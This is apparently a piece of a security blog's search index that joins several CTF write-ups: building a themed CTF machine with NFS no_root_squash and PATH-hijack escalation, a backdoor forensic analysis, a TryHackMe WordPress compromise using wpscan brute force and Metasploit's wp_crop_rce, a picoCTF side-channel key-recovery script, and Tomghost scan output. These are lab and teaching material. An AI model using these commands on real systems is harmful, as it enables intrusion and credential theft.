writable directory listed in the PATH variable,or add a new writable directory to the PATH.For instance, here’s an example of how the attacker can escalate toHanji’s privileges:PATH=\"/home/a.arlert/:$PATH\"cp /bin/bash /home/a.arlert/titan/home/h.zoe/titans # -&gt; h.zoe@paradis:~$From Hanji To ErwinEscalating from Hanji’s account to Erwin’s account, or even to the rootaccount, can be achieved by exploiting the NFS share in Hanji’s homedirectory. This NFS share is configured with the no_root_squash option.Thus, by mounting the NFS share on their local machine, an attacker canplace a SUID binary —owned by root— onto the share. When this binary isexecuted, it runs with root privileges, granting the attacker elevated access. The no_root_squash option in NFS is used to controlhow root access is handled on the client side. When no_root_squash isenabled, the root user on the client machine retains root privileges onthe NFS server. This means that the root user can read, write, and modifyfiles on the NFS share as the root userC. AWS Deployment AutomationTo automate the creation of an EC2 instance along with all necessaryconfigurations such as users, services, and more, we can use AWSCloudFormation3. Amazon Elastic Compute Cloud (EC2) is a part of Amazon.com’s cloud-computingplatform, Amazon Web Services (AWS), that allows users to rent virtualcomputers on which to run their own computer applications. AWS CloudFormation is a service provided by Amazon Web Services (AWS)that enables users to model and manage infrastructure resources in anautomated and secure manner. Using CloudFormation, developers can defineand provision AWS infrastructure resources using a JSON- or YAML-formatted infrastructure as code template.The GitHub repository SNK1 contains the essential files forsetting up and configuring the machine for this CTF environment.Configuration steps are consolidated in the /machine/setup.shscript, which automates the environment setup. Additionally, the/aws-cloudformation.yaml file provides the CloudFormationspecification for defining and deploying the necessary AWS infrastructure.SetupThe setup script is quite straightforward and follows these steps to ensureeverything is configured correctly: Create the users Populate the home repositories with the content from SNK Setup passwords Configure permissions All folders are accessible only to the respective owner Hanji’s folder is accessible to everyone Hanji’s NFS folder is only accessible to her Assignment of SUID bit to /home/h.zoe/titans Allow SSH connection with password for Armin Setup and enable NFS with no_root_squash Install docker and start the web servicesCloudFormation specAs mentioned earlier, the CloudFormation specification file is used todescribe the EC2 instance specifications that will be spawned. It alsoincludes instructions to execute the setup script, which configures users,permissions, and services according to the CTF environment described inthe previous sections.The file begins with the “Parameters” section, which allows us to defineparameters that can be used throughout the template. This section alsomakes it possible to specify or modify these parameters during thecreation of a CloudFormation stack, providing flexibility in customizingthe instance configuration. A stack is a collection of AWS resources that you can manageas a single unit. In other words, you can create, update, or delete acollection of resources by creating, updating, or deleting stacks.For instance, we declare the SSH key pair for root access, the Github repofrom which to pull resources, and the type of EC2 instance to create.In the “Resources” section, we define the resources to be created for ourstack. This includes specifying the EC2 instance (referred to as SNK) thatwill host the CTF environment, along with a security group to permit SSHand HTTP connections. Additionally, we outline several bash commands toexecute after the instance starts, which will clone the SNK repository andrun the setup script.Finally, the “Outputs” section is used to define data to be exported to the CloudFormation dashboard. For our setup, we export the public IP address and EC2 instance ID of the created machine.Once the configuration is complete, you can proceed to the AWS ManagementConsole and search for CloudFormation to deploy the stack.searching for CloudFormation in AWS consoleIn the CloudFormation dashboard, we create a new stack and upload our specfilecreate stack from CloudFormation dashboardpreparing the templateHere, we can see that our parameters have been detected, giving us theoption to either edit them as needed or proceed with the default values.edit the parameters if necessaryWe can skip the next configurations, as they are not immediately relevant.Once the stack is created, it will take a few seconds to allocate theresources. Eventually, the machine will be ready, and we can access itusing the IP address provided in the Outputs tab.resources up and runningLast wordIn conclusion, this project demonstrates the creation and configuration ofa CTF environment inspired by the “The Attack Titan” TV show. From webapplication assessment to privilege escalation, this project offered me anopportunity to learn and revisit many concepts, and it provides you with achance to practice your skills and have some fun.In the next project, we’ll build upon this setup and implement a SIEMsystem to monitor and analyze user behavior when interacting with themachine.Till then… Shinzou wo sasageyo!External Links SNK at GitHub &#8617;&#xfe0e; &#8617;&#xfe0e;2 Crackstation &#8617;&#xfe0e; What is AWS CloudFormation &#8617;&#xfe0e; " }, { "title": "Overpass 3 Hosting", "url": "/posts/overpass-3-hosting/", "categories": "CTF Writeups, TryHackMe, Overpass Series", "tags": "GPG", "date": "2024-03-13 00:00:00 +0100", "snippet": " After Overpass’s rocky start in infosec, and the commercial failure of their passwordmanager and subsequent hack, they’ve decided to try a new business venture.

This is where we can see the full action of the attacker once got a foothold into the machine.The attacker first switched to James’ account to which he has access to the password. Then he listed commands that can be executed byJames with root privileges (sudo -l). Because James can execute whatever command as root (bad practice), the attacker was able to dumpall password hashes from /etc/shadow{ .filepath} and install an ssh-backdoor for persistence. The backdoor runs an SSH server on port 2222 that the attacker can connect to as he possesses a valid password as we’ll see below.Back to the password hashes, we can crack 4 of them using the fasttrack wordlist.$ john hashes.txt -wordlist:fasttrack.txt Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64])Will run 8 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statussecuirty3 (paradox)abcd123 (szymex)secret12 (bee)1qaz2wsx (muirland)2 - Research - Analyse the codeGetting the source code from GitHub$ git clone https://github.com/NinjaJc01/ssh-backdoorIn the main.go file we find the default hash and the hardcoded salt for the backdoor.//...snip...var hash string = \"bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3\"//...snip...func verifyPass(hash, salt, password string) bool { resultHash := hashPassword(password, salt) return resultHash == hash}//...snip...func passwordHandler(_ ssh.Context, password string) bool { return verifyPass(hash, \"1c362db832f3f864c8c2fe05f2002a05\", password)}Back to our pcap file, the attacker changed the default hash of the backdoor.

The information on the running SMB service revealed by the default nmap scripts may be useful in the future.Examining the blog’s home page (mom’s note and comments), it looks like Joel is a not experimented with Wordpress and most likely default configurations are still there. Additionally, we know that Wordpress login is vulnerable to brute force attacks.To validate this idea, we go to the login page (accessible from the “Log in” button in the bottom of the page or alternatively at http://blog.thm/wp-login.php). We enter whatever credentials there (e.g. admin admin), the response is an “invalid username” error message.Notice that when we hover (or click) on a user, we are able to get their username where the redirection link of a user’s page is of the form http://blog.thm/author/&lt;username&gt;.The username of Billy Joel is bjoel.Entering the username in the login page confirms the ability to brute force the login.I tried to brute foce using hydra and the rockyou wordlist but it didn’t work out so I started thinking of other possibilities.Let’s connect to the SMB server and see if we can get any useful information: List available shares on the server$ smbclient -U guest -L &lt;ip_addr&gt;Password for [WORKGROUP\\guest]: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers BillySMB Disk Billy's local SMB Share IPC$ IPC IPC Service (blog server (Samba, Ubuntu))Reconnecting with SMB1 for workgroup listing.

Straight into the rabbit hole :/Back to our wordpress application, I started looking for common vulnerabilities of that specific version and also why hydra was giving wrong passwords as a match. Long story short, hydra is not always a good option (not in this case), and we shuldn’t depend 100% on it. Additionaly, this wordpress version presents a path traversal vulnerability (CVE-2019-8943, CVE-2019-8942) that can be exploited using Metasploit once we have the credentials of a user of at least an author privilege.We have only two users in the blog. This can be verified by navigating to:http://blog.thm/wp-json/wp/v2/usersLet’s try and brute force login passwords of bjoel and kwheel but this time using wpscan (a wordpress security scanner). We are able to find the password of kwheel:$ wpscan --url blog.thm -P /usr/share/wordlists/rockyou.txt -U \"kwheel\"&lt;...snip...&gt;[+] Performing password attack on Xmlrpc against 1 user/sTrying kwheel / morgan1 Time: 00:01:03 &lt; &gt; (2125 / 14344392) 0.01% ETA: ??:??:??[SUCCESS] - kwheel / cutiepie1 &lt;...snip...&gt;Now we move to metasploit for further exploitation.msf6 &gt; use exploit/multi/http/wp_crop_rcemsf6 exploit(multi/http/wp_crop_rce) &gt; set username kwheelmsf6 exploit(multi/http/wp_crop_rce) &gt; set password cutipie1msf6 exploit(multi/http/wp_crop_rce) &gt; set rhosts blog.thmmsf6 exploit(multi/http/wp_crop_rce) &gt; set lhost &lt;your_ip&gt;msf6 exploit(multi/http/wp_crop_rce) &gt; exploitGot access to the machine and now we gotta look for the files.First thing, we check the users on the machine.

There is one unique path of that format on the machine which is /media/usb. And this was the right answer.To Access the content of that folder, we need higher priviliges.Executing the linPEAS.sh script hints about many exploitation vector.

The flag will be of the format picoCTF{} where is 32 lowercase hex characters comprising the 16-byte encryption key being used by the program.Hints The “encryption” algorithm is simple and the correlation between the leakage and the key can be very easily modeled.B. ResolutionTo encrypt a string B = b1b2b3...b16 using the key K = k1k2k3...k16, each plaintext byte is xored with the corresponding key byte, the result C = B xor K = c1c2c3...c16 is used as a set of indexes, each one map to an element of Sbox, the number of elements that have 1 as the least significant bit is returned.Now we denote by Sbox1 (respectively Sbox0) the list of indices of elements of Sbox whose least significant bit is 1 (respectively 0).\\For a given i, if Sbox[ci] has a 0 then necessarily ki xor bi is in the set Sbox0.How is this helpful in figuring out K?If we fix all the bytes of B but one (let it be bi) and iterate over all possibilities of that byte, we’ll be able to tell for which values of bi the encryption ci led to an index from which set of indices. For each iteration, we’ll end up with a set of acceptable values of ki, and by the end, their intersection should lead to a unique index pointing to the element of Sbox that is exactly ki.Our script:#!/usr/bin/env python3import osSbox = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,)PORT = &lt;port&gt;Sbox0 = [i for i in range(256) if Sbox[i] &amp; 0x01 == 0]Sbox1 = [i for i in range(256) if Sbox[i] &amp; 0x01 == 1]def api_call(plain): response = os.popen(f\"echo {plain} | nc saturn.picoctf.net {PORT}\").read(); return int(response.split()[-1])key = []for i in range(16): # fixing bytes we don't care about so that they don't influence the leakage right = \"00\" * i left = \"00\" * (16 - i - 1) # leaks returned by the server, maxl and minl are used to determine which plaintext # values are related to which array (Sbox0 or Sbox1) # note that maxl - minl = 1 leaks = [] maxl = 0 minl = 0 acceptable_keys = set(Sbox) for byte in range(256): plain = right + (\"0\" if (byte &lt;= 15) else \"\") + hex(byte)[2:] + left leak = api_call(plain) # we start processing once we know the difference between values leaking 1s # and values leaking 0s if maxl == minl: leaks.append(api_call(plain)) maxl = max(leaks) minl = min(leaks) else: if leak == maxl: acceptable_keys = acceptable_keys &amp; set([i ^ byte for i in Sbox1]) else: acceptable_keys = acceptable_keys &amp; set([i ^ byte for i in Sbox0]) if len(acceptable_keys) == 1: break key.append(hex(acceptable_keys.pop()))print(key)" }, { "title": "Tomghost", "url": "/posts/tomghost/", "categories": "CTF Writeups, TryHackMe", "tags": "GPG, Ghostcat, john", "date": "2024-02-21 00:00:00 +0100", "snippet": "First, machine scanning$ sudo nmap -sV -sC $IP -Pn -n --disable-arp-ping&lt;...snip...&gt;PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; p...", "content": "First, machine scanning$ sudo nmap -sV -sC $IP -Pn -n --disable-arp-ping&lt;...snip...&gt;PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)| 256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)|_ 256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)53/tcp open tcpwrapped8009/tcp open ajp13 Apache Jserv (Protocol v1.3)| ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS8080/tcp open http Apache Tomcat 9.0.30|_http-favicon: Apache Tomcat|_http-title: Apache Tomcat/9.0.30Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOn port 8080 running an Apache Tomcat 9 web server.

The blocks are 64 bits in size, and so are the keys. The small key size makes the scheme very vulnerable to brute force attacks.2DES tries to fix the issue by using DES twice in a row using different keys. However, this doesn’t increase the key size much, and can be easily cracked using a meet-in-the-middle attack which we’ll be employing below.
